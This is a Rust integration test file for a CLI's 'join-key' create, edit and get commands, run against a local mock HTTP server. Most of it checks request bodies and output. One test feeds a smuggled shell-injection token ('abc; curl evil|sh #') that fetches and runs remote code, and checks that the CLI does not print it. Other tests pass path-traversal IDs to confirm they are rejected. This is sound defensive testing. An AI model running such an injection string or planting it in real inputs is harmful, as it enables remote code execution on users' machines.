//! What `join-key create` / `join-key edit` / `join-key get` put on the wire,
//! against a mock that answers each path with a canned body and records
//! every request's method, target, and JSON body.

mod common;

use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpListener;
use std::process::{Command, Output};
use std::sync::{Arc, Mutex};
use std::thread;

use common::mock_id;
use serde_json::{Value, json};

/// One recorded request: method, target, and the parsed JSON body (`Null`
/// when there was none).
type Request = (String, String, Value);

/// Serve `routes` (path prefix, status line, body); anything unrouted gets a
/// 404 naming the request.
fn serve(routes: Vec<(String, &'static str, String)>) -> (String, Arc<Mutex<Vec<Request>>>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let seen = Arc::new(Mutex::new(Vec::new()));
    let log = Arc::clone(&seen);
    thread::spawn(move || {
        for stream in listener.incoming() {
            let mut stream = stream.unwrap();
            let mut reader = BufReader::new(stream.try_clone().unwrap());
            let mut request_line = String::new();
            reader.read_line(&mut request_line).unwrap();
            let mut content_length = 0;
            let mut line = String::new();
            while reader.read_line(&mut line).unwrap() > 2 {
                if let Some((name, value)) = line.split_once(':')
                    && name.eq_ignore_ascii_case("content-length")
                {
                    content_length = value.trim().parse().unwrap();
                }
                line.clear();
            }
            let mut raw = vec![0; content_length];
            reader.read_exact(&mut raw).unwrap();
            let sent = if raw.is_empty() {
                Value::Null
            } else {
                serde_json::from_slice(&raw).unwrap()
            };
            let mut parts = request_line.split(' ');
            let method = parts.next().unwrap_or_default().to_string();
            let target = parts.next().unwrap_or_default().to_string();
            let path = target.split('?').next().unwrap_or_default().to_string();
            let unrouted = format!(
                r#"{{"errors":[{{"code":"ERR_NOT_FOUND","message":"unrouted {method} {path}"}}]}}"#
            );
            let (status, body) = routes
                .iter()
                .find(|(p, _, _)| path.starts_with(p.as_str()))
                .map_or(("404 Not Found", unrouted.as_str()), |(_, s, b)| {
                    (*s, b.as_str())
                });
            log.lock().unwrap().push((method, target, sent));
            write!(
                stream,
                "HTTP/1.1 {status}\r\nContent-Type: application/json\r\n\
                 Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            )
            .unwrap();
        }
    });
    (url, seen)
}

fn dn(url: &str, args: &[&str]) -> Output {
    let dir = tempfile::tempdir().unwrap();
    Command::new(env!("CARGO_BIN_EXE_dn"))
        .args(args)
        .env("DN_CONFIG_DIR", dir.path())
        .env("DEFINED_API_URL", url)
        .env("DEFINED_API_KEY", "fake-test-key")
        .output()
        .unwrap()
}

fn requests(seen: &Arc<Mutex<Vec<Request>>>) -> Vec<Request> {
    seen.lock().unwrap().clone()
}

fn stdout_json(out: &Output) -> Value {
    serde_json::from_slice(&out.stdout).unwrap()
}

const TOKEN: &str =
    "dnjoin-P3RCTXN5LVFGBMJNYF2QHKWDOA-6YQKZ3VNB2XGJ4MEPLRT7WCSAHDUF5IO3QXBKZNYV2MJ4RLEHGTA";

fn key(network: &str, token: bool) -> Value {
    let mut data = json!({
        "id": "dnjoin-P3RCTXN5LVFGBMJNYF2QHKWDOA", "name": "ci-runner",
        "networkID": network, "roleID": null, "tags": [],
        "autoAssignCIDRs": ["100.100.0.0/22", "fd00:c0:c0::/80"],
        "expiresAt": null, "createdAt": "2026-10-29T15:00:00Z",
        "modifiedAt": "2026-10-29T15:00:00Z"
    });
    if token {
        data["token"] = json!(TOKEN);
    }
    json!({"data": data, "metadata": {}})
}

fn networks(rows: &[(&str, &[&str])]) -> String {
    let data: Vec<Value> = rows
        .iter()
        .map(|(id, cidrs)| json!({"id": id, "name": id, "cidrs": cidrs}))
        .collect();
    json!({"data": data, "metadata": {"hasNextPage": false}}).to_string()
}

#[test]
fn create_auto_picks_the_only_network_and_its_ipv4_prefix() {
    let network = mock_id("network", "office");
    let (url, seen) = serve(vec![
        (
            "/v2/networks".into(),
            "200 OK",
            networks(&[(&network, &["fd00:c0:c0::/80", "100.100.0.0/22"])]),
        ),
        (
            "/v1/join-keys".into(),
            "200 OK",
            key(&network, true).to_string(),
        ),
    ]);
    let out = dn(&url, &["--json", "join-key", "create", "ci-runner"]);
    assert!(out.status.success(), "{out:?}");
    assert_eq!(stdout_json(&out)["data"]["token"], TOKEN);
    let sent = requests(&seen);
    assert_eq!(sent[0].1, "/v2/networks?pageSize=500");
    assert_eq!(
        (sent[1].0.as_str(), sent[1].1.as_str(), &sent[1].2),
        (
            "POST",
            "/v1/join-keys",
            &json!({
                "name": "ci-runner",
                "networkID": network,
                "autoAssignCIDRs": ["100.100.0.0/22"],
            })
        )
    );
}

#[test]
fn create_with_a_network_reads_it_for_the_ipv4_prefix_unless_told_not_to() {
    let network = mock_id("network", "office");
    let role = mock_id("role", "ci");
    let routes = vec![
        (
            format!("/v2/networks/{network}"),
            "200 OK",
            json!({"data": {"id": network, "cidrs": ["100.100.0.0/22"]}}).to_string(),
        ),
        (
            "/v1/join-keys".into(),
            "200 OK",
            key(&network, true).to_string(),
        ),
    ];
    let (url, seen) = serve(routes.clone());
    let out = dn(
        &url,
        &[
            "--json",
            "join-key",
            "create",
            "ci-runner",
            "--network",
            &network,
            "--role",
            &role,
            "--tag",
            "env:ci",
            "--tag",
            "team:infra",
            "--expires-at",
            "2099-01-01T00:00:00Z",
        ],
    );
    assert!(out.status.success(), "{out:?}");
    let sent = requests(&seen);
    assert_eq!(sent[0].1, format!("/v2/networks/{network}"));
    assert_eq!(
        sent[1].2,
        json!({
            "name": "ci-runner", "networkID": network, "roleID": role,
            "tags": ["env:ci", "team:infra"], "autoAssignCIDRs": ["100.100.0.0/22"],
            "expiresAt": "2099-01-01T00:00:00Z",
        })
    );

    // --no-ipv4 and --cidr both settle the prefixes, so no network read.
    for (extra, cidrs) in [
        (vec!["--no-ipv4"], Value::Null),
        (
            vec!["--cidr", "fd00:c0:c0::/80"],
            json!(["fd00:c0:c0::/80"]),
        ),
    ] {
        let (url, seen) = serve(routes.clone());
        let mut args = vec![
            "--json",
            "join-key",
            "create",
            "ci-runner",
            "--network",
            &network,
        ];
        args.extend(extra.iter());
        let out = dn(&url, &args);
        assert!(out.status.success(), "{extra:?}: {out:?}");
        let sent = requests(&seen);
        assert_eq!(sent.len(), 1, "{extra:?}: {sent:?}");
        assert_eq!(sent[0].1, "/v1/join-keys");
        assert_eq!(
            sent[0]
                .2
                .get("autoAssignCIDRs")
                .cloned()
                .unwrap_or(Value::Null),
            cidrs,
            "{extra:?}"
        );
    }
}

#[test]
fn create_expires_in_sends_a_timestamp_near_now_plus_the_duration() {
    let network = mock_id("network", "office");
    let (url, seen) = serve(vec![(
        "/v1/join-keys".into(),
        "200 OK",
        key(&network, true).to_string(),
    )]);
    let out = dn(
        &url,
        &[
            "--json",
            "join-key",
            "create",
            "ci-runner",
            "--network",
            &network,
            "--no-ipv4",
            "--expires-in",
            "1d12h",
        ],
    );
    assert!(out.status.success(), "{out:?}");
    let sent = requests(&seen);
    let at = sent[0].2["expiresAt"].as_str().unwrap();
    // RFC 3339 in UTC, read back without a date library.
    let (date, time) = at.split_once('T').unwrap();
    assert_eq!(date.len(), 10, "{at}");
    assert!(time.ends_with('Z') && time.len() == 9, "{at}");
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    // Days since the epoch from the date part, to within a day of now + 36h.
    let parts: Vec<u64> = date.split('-').map(|p| p.parse().unwrap()).collect();
    let (y, m, d) = (parts[0] as i64, parts[1] as i64, parts[2] as i64);
    let (y, m) = if m <= 2 { (y - 1, m + 9) } else { (y, m - 3) };
    let days = 365 * y + y / 4 - y / 100 + y / 400 + (153 * m + 2) / 5 + d - 719_469;
    let want = (now + 129_600) / 86_400;
    assert!((days - want as i64).abs() <= 1, "{at}");
}

#[test]
fn create_prints_the_token_in_an_enroll_command_and_warns_it_is_shown_once() {
    let network = mock_id("network", "office");
    let (url, _) = serve(vec![(
        "/v1/join-keys".into(),
        "200 OK",
        key(&network, true).to_string(),
    )]);
    let out = dn(
        &url,
        &[
            "join-key",
            "create",
            "ci-runner",
            "--network",
            &network,
            "--no-ipv4",
        ],
    );
    assert!(out.status.success(), "{out:?}");
    let stdout = String::from_utf8(out.stdout).unwrap();
    assert!(
        stdout.contains(&format!("  dnclient enroll -code {TOKEN}\n")),
        "{stdout}"
    );
    assert!(stdout.contains("shown only this once"), "{stdout}");
    assert!(stdout.contains("Expires:            never\n"), "{stdout}");
}

#[test]
fn create_without_a_usable_token_says_how_to_replace_the_key() {
    let network = mock_id("network", "office");
    let mut created = key(&network, false);
    created["data"]["token"] = json!("abc; curl evil|sh #");
    let (url, _) = serve(vec![(
        "/v1/join-keys".into(),
        "200 OK",
        created.to_string(),
    )]);
    let out = dn(
        &url,
        &[
            "join-key",
            "create",
            "ci-runner",
            "--network",
            &network,
            "--no-ipv4",
        ],
    );
    assert!(out.status.success(), "{out:?}");
    let stdout = String::from_utf8(out.stdout).unwrap();
    assert!(!stdout.contains("dnclient enroll"), "{stdout}");
    assert!(!stdout.contains("curl"), "{stdout}");
    assert!(
        stdout.contains("dn join-key delete dnjoin-P3RCTXN5LVFGBMJNYF2QHKWDOA"),
        "{stdout}"
    );
}

#[test]
fn edit_patches_only_the_fields_given() {
    let network = mock_id("network", "office");
    let id = "dnjoin-P3RCTXN5LVFGBMJNYF2QHKWDOA";
    for (extra, body) in [
        (vec!["--name", "ci"], json!({"name": "ci"})),
        (vec!["--no-expiry"], json!({"expiresAt": null})),
        (
            vec!["--expires-at", "2099-06-01T00:00:00Z"],
            json!({"expiresAt": "2099-06-01T00:00:00Z"}),
        ),
        (
            vec!["--name", "ci", "--no-expiry"],
            json!({"name": "ci", "expiresAt": null}),
        ),
    ] {
        let (url, seen) = serve(vec![(
            "/v1/join-keys/".into(),
            "200 OK",
            key(&network, false).to_string(),
        )]);
        let mut args = vec!["--json", "join-key", "edit", id];
        args.extend(extra.iter());
        let out = dn(&url, &args);
        assert!(out.status.success(), "{extra:?}: {out:?}");
        assert_eq!(stdout_json(&out), key(&network, false), "{extra:?}");
        assert_eq!(
            requests(&seen),
            [("PATCH".to_string(), format!("/v1/join-keys/{id}"), body)],
            "{extra:?}"
        );
    }
}

#[test]
fn get_reads_v1_and_json_passes_the_response_through() {
    let network = mock_id("network", "office");
    let id = "dnjoin-P3RCTXN5LVFGBMJNYF2QHKWDOA";
    let (url, seen) = serve(vec![(
        "/v1/join-keys/".into(),
        "200 OK",
        key(&network, false).to_string(),
    )]);
    let out = dn(&url, &["--json", "join-key", "get", id]);
    assert!(out.status.success(), "{out:?}");
    assert_eq!(stdout_json(&out), key(&network, false));
    let out = dn(&url, &["join-key", "get", id]);
    assert!(out.status.success(), "{out:?}");
    let stdout = String::from_utf8(out.stdout).unwrap();
    assert!(stdout.starts_with("ci-runner\n"), "{stdout}");
    assert!(
        stdout.contains("Role:               default role\n"),
        "{stdout}"
    );
    assert!(!stdout.contains("token"), "{stdout}");
    // No role on the key, so no role lookup either time.
    let paths: Vec<String> = requests(&seen).into_iter().map(|(_, p, _)| p).collect();
    assert_eq!(
        paths,
        [format!("/v1/join-keys/{id}"), format!("/v1/join-keys/{id}")]
    );
}

#[test]
fn bad_input_fails_before_any_request() {
    let network = mock_id("network", "office");
    let id = "dnjoin-P3RCTXN5LVFGBMJNYF2QHKWDOA";
    let (url, seen) = serve(vec![]);
    for args in [
        vec!["join-key", "get", "dnjoin-1/../x"],
        vec!["join-key", "create", "CI-Runner", "--network", &network],
        vec!["join-key", "create", "ci-", "--network", &network],
        vec!["join-key", "create", "ci", "--network", "network-1"],
        vec![
            "join-key",
            "create",
            "ci",
            "--network",
            &network,
            "--role",
            "any",
        ],
        vec![
            "join-key",
            "create",
            "ci",
            "--network",
            &network,
            "--tag",
            "nocolon",
        ],
        vec![
            "join-key",
            "create",
            "ci",
            "--network",
            &network,
            "--cidr",
            "100.100.0.1",
        ],
        vec![
            "join-key",
            "create",
            "ci",
            "--network",
            &network,
            "--expires-at",
            "2020-01-01T00:00:00Z",
        ],
        vec![
            "join-key",
            "create",
            "ci",
            "--network",
            &network,
            "--expires-at",
            "next week",
        ],
        vec![
            "join-key",
            "create",
            "ci",
            "--network",
            &network,
            "--expires-in",
            "7x",
        ],
        vec!["join-key", "edit", id],
        vec!["join-key", "edit", id, "--name", "ci_runner"],
        vec!["join-key", "edit", "dnjoin-1?x", "--no-expiry"],
    ] {
        let out = dn(&url, &args);
        assert_eq!(out.status.code(), Some(1), "{args:?}: {out:?}");
        let out = dn(&url, &[&["--json"][..], &args].concat());
        assert_eq!(
            stdout_json(&out)["errors"][0]["code"],
            "ERR_INVALID_ARGUMENT",
            "{args:?}"
        );
    }
    assert!(requests(&seen).is_empty());
}

#[test]
fn api_errors_surface_with_exit_1() {
    let network = mock_id("network", "office");
    let (url, seen) = serve(vec![(
        "/v1/join-keys".into(),
        "400 Bad Request",
        r#"{"errors":[{"code":"ERR_DUPLICATE_VALUE","message":"value already exists","path":"name"}]}"#.into(),
    )]);
    let out = dn(
        &url,
        &[
            "--json",
            "join-key",
            "create",
            "ci-runner",
            "--network",
            &network,
            "--no-ipv4",
        ],
    );
    assert_eq!(out.status.code(), Some(1), "{out:?}");
    let printed = stdout_json(&out);
    assert_eq!(printed["status"], 400);
    assert_eq!(printed["errors"][0]["code"], "ERR_DUPLICATE_VALUE");
    assert_eq!(requests(&seen).len(), 1);
}
